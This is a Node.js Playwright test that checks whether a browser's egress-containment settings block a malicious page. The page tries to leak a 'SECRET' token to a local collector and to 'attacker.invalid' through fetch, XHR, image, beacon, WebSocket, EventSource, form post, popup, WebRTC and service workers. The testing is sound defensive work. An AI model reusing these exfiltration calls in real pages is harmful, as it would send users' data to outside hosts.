import dgram from "node:dgram";
import net from "node:net";
import { readFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { chromium } from "@playwright/test";
import {
  BROWSER_EGRESS_PROXY_ENV,
  DEFAULT_CANDIDATE_ORIGIN,
  EGRESS_CONTEXT_OPTIONS,
  browserEgressLaunchOptions,
  parseEgressDenialLog,
} from "./browserEgressContainment.mjs";

/** File the trusted workflow redirects the proxy's stdout into. */
const PROXY_LOG_ENV = "BROWSER_EGRESS_PROXY_LOG";

/**
 * Runtime proof that the browser launched with the egress options cannot
 * deliver anything to a non-allowlisted collector, while an allowlisted origin
 * still works. The collector sits on 127.0.0.2: loopback, so without the proxy
 * and the Chromium flags a page reaches it trivially. Every channel a malicious
 * page could use is exercised: fetch, XHR, image, sendBeacon, WebSocket,
 * EventSource, form post, iframe and top-level navigation, popup, WebRTC (UDP)
 * and service worker registration.
 *
 * It uses the REAL launch options from browserEgressContainment.mjs, so a
 * regression there fails this proof.
 */

const COLLECTOR_HOST = "127.0.0.2";
const SETTLE_MS = 2500;

async function startTcpCollector() {
  const hits = [];
  const server = net.createServer((socket) => {
    hits.push("tcp-connection");
    socket.on("data", () => hits.push("tcp-data"));
    socket.on("error", () => {});
    socket.end("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, COLLECTOR_HOST, resolve);
  });
  return { hits, port: server.address().port, close: () => server.close() };
}

async function startUdpCollector() {
  const hits = [];
  const socket = dgram.createSocket("udp4");
  socket.on("message", () => hits.push("udp-packet"));
  await new Promise((resolve, reject) => {
    socket.once("error", reject);
    socket.bind(0, COLLECTOR_HOST, resolve);
  });
  return { hits, port: socket.address().port, close: () => socket.close() };
}

/** Runs inside the page. Never throws: each channel reports its own outcome. */
async function attackFromPage({ tcpPort, udpPort, host, allowedUrl }) {
  const target = `http://${host}:${tcpPort}/exfil?token=SECRET`;
  const outcomes = {};
  const attempt = async (name, fn) => {
    try {
      outcomes[name] = String((await fn()) ?? "ok");
    } catch (error) {
      outcomes[name] = "threw:" + (error && error.name ? error.name : "error");
    }
  };

  await attempt("fetch", () => fetch(target, { mode: "no-cors", credentials: "include" }).then((r) => r.type));
  await attempt("fetch-keepalive", () => fetch(target, { mode: "no-cors", keepalive: true, method: "POST", body: "SECRET" }).then((r) => r.type));
  await attempt("fetch-https", () => fetch(`https://${host}:${tcpPort}/exfil`, { mode: "no-cors" }).then((r) => r.type));
  await attempt("fetch-unknown-name", () => fetch("http://attacker.invalid/exfil", { mode: "no-cors" }).then((r) => r.type));
  await attempt("xhr", () => new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", target);
    xhr.onloadend = () => resolve("done");
    xhr.send();
  }));
  await attempt("image", () => new Promise((resolve) => {
    const img = new Image();
    img.onload = img.onerror = () => resolve("done");
    img.src = target;
  }));
  await attempt("beacon", () => String(navigator.sendBeacon(target, "SECRET")));
  await attempt("websocket", () => new Promise((resolve) => {
    const ws = new WebSocket(`ws://${host}:${tcpPort}/exfil`);
    ws.onopen = () => resolve("open");
    ws.onerror = () => resolve("error");
    ws.onclose = () => resolve("close");
    setTimeout(() => resolve("timeout"), 2000);
  }));
  await attempt("eventsource", () => new Promise((resolve) => {
    const source = new EventSource(target);
    source.onerror = () => { source.close(); resolve("error"); };
    setTimeout(() => { source.close(); resolve("timeout"); }, 2000);
  }));
  await attempt("iframe", () => new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.onload = frame.onerror = () => resolve("done");
    frame.src = target;
    document.body.appendChild(frame);
    setTimeout(() => resolve("timeout"), 2000);
  }));
  await attempt("form-post", () => new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.name = "egress-form-target";
    document.body.appendChild(frame);
    const form = document.createElement("form");
    form.method = "POST";
    form.action = target;
    form.target = "egress-form-target";
    form.innerHTML = '<input name="d" value="SECRET">';
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => resolve("submitted"), 1000);
  }));
  await attempt("popup", () => String(Boolean(window.open(target, "_blank"))));
  await attempt("webrtc", async () => {
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: `stun:${host}:${udpPort}` },
        { urls: `turn:${host}:${udpPort}?transport=udp`, username: "u", credential: "SECRET" },
      ],
    });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise((resolve) => setTimeout(resolve, 1500));
    pc.close();
    return "attempted";
  });
  await attempt("service-worker", async () => {
    if (!("serviceWorker" in navigator)) return "unavailable";
    // With serviceWorkers:"block" Playwright makes register() resolve with
    // undefined and never fetches the script, so a resolved promise alone is not
    // evidence of a registration: ask the browser what is actually registered.
    await navigator.serviceWorker.register("/__egress_sw.js");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    const registrations = await navigator.serviceWorker.getRegistrations();
    return registrations.length > 0 ? "REGISTERED" : "blocked";
  });

  let allowedStatus = 0;
  try {
    allowedStatus = (await fetch(allowedUrl)).status;
  } catch {
    allowedStatus = -1;
  }
  return { outcomes, allowedStatus };
}

/**
 * @param {{
 *   env?: Record<string, string | undefined>,
 *   allowedOrigin?: string,
 *   allowedPath?: string,
 *   readProxyLog?: () => Promise<string> | string,
 * }} [options]
 */
export async function runBrowserEgressProof({
  env = process.env,
  allowedOrigin = DEFAULT_CANDIDATE_ORIGIN,
  allowedPath = "/api/health",
  // Supplies the proxy's own (fixed-vocabulary) denial log. Defaults to the file
  // named by BROWSER_EGRESS_PROXY_LOG; when neither exists the proof fails closed.
  readProxyLog = env[PROXY_LOG_ENV]
    ? () => readFile(env[PROXY_LOG_ENV], "utf8")
    : undefined,
} = {}) {
  const launch = browserEgressLaunchOptions({ ...env, BROWSER_EGRESS_REQUIRED: "1" });
  const tcp = await startTcpCollector();
  const udp = await startUdpCollector();
  const failures = [];
  let attackResult = { outcomes: {}, allowedStatus: 0 };
  let navigation = "not-run";

  const browser = await chromium.launch({ headless: true, ...launch });
  try {
    const context = await browser.newContext({ ...EGRESS_CONTEXT_OPTIONS });
    // The page itself is synthesised at the allowlisted origin so it is a secure
    // context (service workers need one) without involving the real candidate.
    // Only the attack's own requests then cross the network, via the proxy.
    await context.route(`${allowedOrigin}/__egress_proof__`, (route) =>
      route.fulfill({ contentType: "text/html", body: "<!doctype html><title>proof</title><body></body>" }),
    );
    await context.route(`${allowedOrigin}/__egress_sw.js`, (route) =>
      route.fulfill({ contentType: "text/javascript", body: "self.addEventListener('fetch',()=>{});" }),
    );
    const page = await context.newPage();
    await page.goto(`${allowedOrigin}/__egress_proof__`);
    attackResult = await page.evaluate(attackFromPage, {
      tcpPort: tcp.port,
      udpPort: udp.port,
      host: COLLECTOR_HOST,
      allowedUrl: `${allowedOrigin}${allowedPath}`,
    });

    const nav = await context.newPage();
    navigation = await nav
      .goto(`http://${COLLECTOR_HOST}:${tcp.port}/exfil?token=SECRET`, { timeout: 5000 })
      .then((response) => `response:${response?.status() ?? "none"}`)
      .catch(() => "failed");
    await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
  } finally {
    await browser.close().catch(() => {});
    tcp.close();
    udp.close();
  }

  if (tcp.hits.length > 0) failures.push(`collector received TCP traffic (${tcp.hits.length} events)`);
  if (udp.hits.length > 0) failures.push(`collector received UDP traffic (${udp.hits.length} packets)`);
  if (attackResult.allowedStatus !== 200) {
    failures.push(`allowlisted origin was not reachable through the proxy (status ${attackResult.allowedStatus})`);
  }
  if (attackResult.outcomes["service-worker"] !== "blocked") {
    failures.push("service worker registration was not reported blocked");
  }

  // Positive control: the proxy itself must have recorded the refusals. Only
  // fixed reason codes are read back; the host of the probe is never logged.
  /** @type {Record<string, number> | null} */
  let proxyDenials = null;
  try {
    if (!readProxyLog) throw new Error("no proxy log");
    const parsed = parseEgressDenialLog(await readProxyLog());
    proxyDenials = { ...parsed.denials, unrecognized: parsed.unrecognized };
  } catch {
    failures.push("the proxy denial log could not be read");
  }
  if (proxyDenials) {
    if (!(proxyDenials["not-allowlisted-loopback"] >= 1)) {
      failures.push("the proxy did not record a denial of the loopback collector probe");
    }
    if (proxyDenials.unrecognized > 0) {
      failures.push("the proxy log contained lines outside the fixed vocabulary");
    }
  }
  return {
    ok: failures.length === 0,
    failures,
    collector: { tcpEvents: tcp.hits.length, udpPackets: udp.hits.length },
    allowedStatus: attackResult.allowedStatus,
    topLevelNavigation: navigation,
    channels: attackResult.outcomes,
    proxyDenials,
  };
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  if (!process.env[BROWSER_EGRESS_PROXY_ENV]) {
    process.stderr.write(`${BROWSER_EGRESS_PROXY_ENV} is required.\n`);
    process.exit(1);
  }
  runBrowserEgressProof({
    allowedOrigin: process.env.BROWSER_EGRESS_ALLOWED_ORIGIN || DEFAULT_CANDIDATE_ORIGIN,
    allowedPath: process.env.BROWSER_EGRESS_ALLOWED_PATH || "/api/health",
  })
    .then((result) => {
      process.stdout.write(JSON.stringify(result, null, 2) + "\n");
      process.exit(result.ok ? 0 : 1);
    })
    .catch((error) => {
      process.stderr.write(`Egress proof could not run: ${error instanceof Error ? error.message : "unknown"}\n`);
      process.exit(1);
    });
}
